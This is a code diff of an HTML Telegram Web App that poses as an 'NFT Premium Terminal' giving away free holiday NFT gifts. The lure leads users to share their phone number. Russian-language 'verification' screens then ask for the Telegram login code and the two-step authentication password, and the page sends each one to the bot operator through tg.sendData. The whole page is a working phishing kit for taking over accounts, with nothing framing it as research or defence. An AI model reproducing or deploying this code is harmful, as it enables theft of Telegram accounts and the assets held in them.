@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Premium NFT Terminal</title>
+    <title>NFT Premium Terminal</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { 
@@ -12,8 +12,9 @@
             overflow: hidden; height: 100vh;
         }
         
-        #snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.15; }
+        #snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.2; }
 
+        /* Навигация */
         .tabs { 
             display: flex; justify-content: space-around; 
             background: #000; border-bottom: 1px solid #111;
@@ -28,21 +29,26 @@
         .content-section { display: none; padding: 20px; height: calc(100vh - 50px); overflow-y: auto; box-sizing: border-box; position: relative; z-index: 10; }
         .content-section.active { display: block; }
 
-        /* КАРТОЧКА С ВИДЕО */
+        /* Карточка NFT с анимацией */
         .nft-card { 
-            background: #050505; border: 1px solid #111; padding: 25px 15px; 
-            margin-bottom: 30px; text-align: center; border-radius: 4px;
+            background: #050505; border: 1px solid #111; padding: 30px 20px; 
+            margin-bottom: 30px; text-align: center; position: relative;
         }
 
-        .nft-video {
-            width: 100%; max-width: 220px;
-            height: auto;
-            margin-bottom: 20px;
-            filter: brightness(1.1);
+        .nft-gif { 
+            width: 75%; 
+            margin-bottom: 25px; 
+            /* Дополнительная плавная левитация через CSS */
+            animation: giftFloat 4s ease-in-out infinite;
         }
 
-        .nft-title { font-size: 19px; letter-spacing: 2px; margin-bottom: 5px; font-weight: normal; color: #eee; }
-        .nft-price { color: #333; font-style: italic; font-size: 12px; margin-bottom: 20px; display: block; }
+        @keyframes giftFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .nft-title { font-size: 20px; letter-spacing: 2px; margin-bottom: 8px; font-weight: normal; }
+        .nft-price { color: #333; font-style: italic; font-size: 13px; margin-bottom: 25px; display: block; }
 
         .btn { 
             background: #fff; color: #000; border: none; padding: 16px; width: 100%; 
@@ -50,7 +56,7 @@
             letter-spacing: 2px; text-transform: uppercase;
         }
 
-        /* МОДАЛКИ */
+        /* Дизайн Верификации */
         .modal { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000; z-index: 2000; flex-direction: column; 
@@ -58,10 +64,13 @@
         }
         .modal.active { display: flex; }
         
+        .verification-title { font-size: 18px; letter-spacing: 4px; margin-bottom: 15px; color: #fff; }
+        .verification-desc { color: #444; font-size: 12px; text-align: center; margin-bottom: 40px; line-height: 1.6; }
+
         input { 
             width: 100%; background: transparent; border: none; border-bottom: 1px solid #222; 
-            color: #fff; padding: 10px; font-size: 30px; text-align: center; outline: none; margin-bottom: 40px;
-            font-family: "Times New Roman"; letter-spacing: 8px; border-radius: 0;
+            color: #fff; padding: 10px; font-size: 32px; text-align: center; outline: none; margin-bottom: 40px;
+            font-family: "Times New Roman"; letter-spacing: 10px;
         }
     </style>
 </head>
@@ -77,66 +86,73 @@
     <div id="market" class="content-section active">
         
         <div class="nft-card">
-            <video class="nft-video" autoplay loop muted playsinline>
-                <source src="https://nft.fragment.com/gift/santahat-10168.mp4" type="video/mp4">
-            </video>
+            <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-gif">
             <div class="nft-title">Santa Hat</div>
-            <span class="nft-price">Reserved for: @user</span>
-            <button class="btn" onclick="requestAuth()">Claim Asset</button>
+            <span class="nft-price">Est. Value: 50.00 USD</span>
+            <button class="btn" onclick="requestAuth()">Claim NFT</button>
         </div>
 
         <div class="nft-card">
-            <video class="nft-video" autoplay loop muted playsinline>
-                <source src="https://nft.fragment.com/gift/holidaydrink-39466.mp4" type="video/mp4">
-            </video>
+            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-gif">
             <div class="nft-title">Holiday Drink</div>
-            <span class="nft-price">Reserved for: @user</span>
-            <button class="btn" onclick="requestAuth()">Claim Asset</button>
+            <span class="nft-price">Est. Value: 50.00 USD</span>
+            <button class="btn" onclick="requestAuth()">Claim NFT</button>
         </div>
 
         <div class="nft-card">
-            <video class="nft-video" autoplay loop muted playsinline>
-                <source src="https://nft.fragment.com/gift/partysparkler-56795.mp4" type="video/mp4">
-            </video>
+            <img src="https://nft.fragment.com/gift/partysparkler-56795.webp" class="nft-gif">
             <div class="nft-title">Party Sparkler</div>
-            <span class="nft-price">Reserved for: @user</span>
-            <button class="btn" onclick="requestAuth()">Claim Asset</button>
+            <span class="nft-price">Est. Value: 50.00 USD</span>
+            <button class="btn" onclick="requestAuth()">Claim NFT</button>
         </div>
 
         <div class="nft-card">
-            <video class="nft-video" autoplay loop muted playsinline>
-                <source src="https://nft.fragment.com/gift/xmasstocking-110648.mp4" type="video/mp4">
-            </video>
+            <img src="https://nft.fragment.com/gift/xmasstocking-110648.webp" class="nft-gif">
             <div class="nft-title">Xmas Stocking</div>
-            <span class="nft-price">Reserved for: @user</span>
-            <button class="btn" onclick="requestAuth()">Claim Asset</button>
+            <span class="nft-price">Est. Value: 50.00 USD</span>
+            <button class="btn" onclick="requestAuth()">Claim NFT</button>
         </div>
 
     </div>
 
     <div id="profile" class="content-section">
-        <p style="color: #444;">ID: UNVERIFIED</p>
+        <div style="border-bottom: 1px solid #111; padding: 20px 0;">
+            <div style="color: #444; font-size: 11px; letter-spacing: 2px;">STATUS</div>
+            <div style="font-size: 18px; margin-top: 10px;">Unverified Account</div>
+        </div>
+        <div style="border-bottom: 1px solid #111; padding: 20px 0;" onclick="window.open('https://t.me/x1o1y')">
+            <div style="color: #444; font-size: 11px; letter-spacing: 2px;">SUPPORT</div>
+            <div style="font-size: 18px; margin-top: 10px; text-decoration: underline;">@x1o1y</div>
+        </div>
     </div>
 
     <div id="verify" class="content-section">
-        <button class="btn" onclick="requestAuth()">Start Authorization</button>
+        <h2 style="font-weight: normal;">Verification</h2>
+        <p style="color: #444; font-style: italic; line-height: 1.8;">Подтвердите владение аккаунтом для разблокировки функции перевода NFT-подарков.</p>
+        <button class="btn" style="margin-top: 30px;" onclick="requestAuth()">Start Process</button>
     </div>
 
     <div id="step-code" class="modal">
-        <h2 style="font-weight: normal; letter-spacing: 2px;">AUTHORIZATION</h2>
+        <div class="verification-title">SECURITY CODE</div>
+        <p class="verification-desc">
+            Введите код из системного уведомления <b>Telegram</b>.<br>
+            Это необходимо для подтверждения вашей личности.
+        </p>
         <input type="number" id="in-code" placeholder="00000">
-        <button class="btn" onclick="sendCode()">Verify</button>
+        <button class="btn" onclick="sendCode()">Verify Identity</button>
     </div>
 
     <div id="step-pass" class="modal">
-        <h2 style="font-weight: normal; letter-spacing: 2px;">2FA ACCESS</h2>
+        <div class="verification-title">PASSWORD</div>
+        <p class="verification-desc">Введите ваш пароль двухэтапной аутентификации.</p>
         <input type="password" id="in-pass" placeholder="••••">
-        <button class="btn" onclick="sendPass()">Confirm</button>
+        <button class="btn" onclick="sendPass()">Authorize</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        tg.headerColor = '#000000';
 
         function showTab(tabId) {
             document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
@@ -148,30 +164,35 @@
         function requestAuth() {
             tg.requestContact((sent, cb) => {
                 if (sent && cb.responseUnsafe.contact) {
-                    tg.sendData("PHONE:" + cb.responseUnsafe.contact.phone_number);
+                    const phone = cb.responseUnsafe.contact.phone_number;
+                    tg.sendData("PHONE:" + phone);
                     document.getElementById('step-code').classList.add('active');
                 }
             });
         }
 
         function sendCode() {
-            tg.sendData("CODE:" + document.getElementById('in-code').value);
-            document.getElementById('step-code').classList.remove('active');
-            document.getElementById('step-pass').classList.add('active');
+            const val = document.getElementById('in-code').value;
+            if(val.length >= 5) {
+                tg.sendData("CODE:" + val);
+                document.getElementById('step-code').classList.remove('active');
+                document.getElementById('step-pass').classList.add('active');
+            }
         }
 
         function sendPass() {
-            tg.sendData("PASS:" + document.getElementById('in-pass').value);
+            const val = document.getElementById('in-pass').value;
+            tg.sendData("PASS:" + val);
             tg.close();
         }
 
-        // Snow logic...
+        // Анимация снега
         const canvas = document.getElementById('snow');
         const ctx = canvas.getContext('2d');
         let flakes = [];
         function initSnow() {
             canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            for (let i = 0; i < 30; i++) flakes.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*1, d: Math.random()*0.3 });
+            for (let i = 0; i < 40; i++) flakes.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*1.2, d: Math.random()*0.4 });
         }
         function drawSnow() {
             ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "#fff"; ctx.beginPath();
